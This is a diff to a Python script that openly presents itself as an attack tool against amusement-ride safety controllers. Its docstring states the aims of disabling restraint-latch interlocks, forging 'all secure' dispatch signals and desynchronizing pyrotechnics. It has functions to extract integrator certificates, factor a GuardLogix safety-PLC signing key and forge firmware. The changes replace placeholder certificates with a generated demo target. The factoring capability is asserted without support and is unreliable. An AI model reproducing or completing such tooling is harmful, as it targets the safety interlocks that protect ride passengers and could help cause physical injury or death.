@@ -4,8 +4,10 @@ attractions. Disable restraint-latch interlocks, forge "all secure" dispatch
 signals, desynchronize show-control pyrotechnics. ASTM F24 / EN 13814.
 """
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
+
+_demo = generate_demo_target()
 
 import json
 import hashlib
@@ -30,7 +32,7 @@ def extract_ride_integrator_cert(attraction_id: str) -> bytes:
     manifest binding the firmware set to a specific attraction installation.
     """
     print(f"[*] extracting integrator cert for attraction {attraction_id}")
-    return b"-----BEGIN CERTIFICATE-----\n...(integrator cert)...\n-----END CERTIFICATE-----\n"
+    return _demo["pub_pem"]
 
 
 def forge_safety_plc_firmware(factorer: PolynomialFactorer,
@@ -113,7 +115,7 @@ if __name__ == "__main__":
     print()
 
     print("[1] extracting Rockwell GuardLogix signing cert...")
-    vendor_cert = b"-----BEGIN CERTIFICATE-----\n...\n-----END CERTIFICATE-----\n"
+    vendor_cert = _demo["pub_pem"]
 
     print("[2] factoring safety PLC signing key...")
 
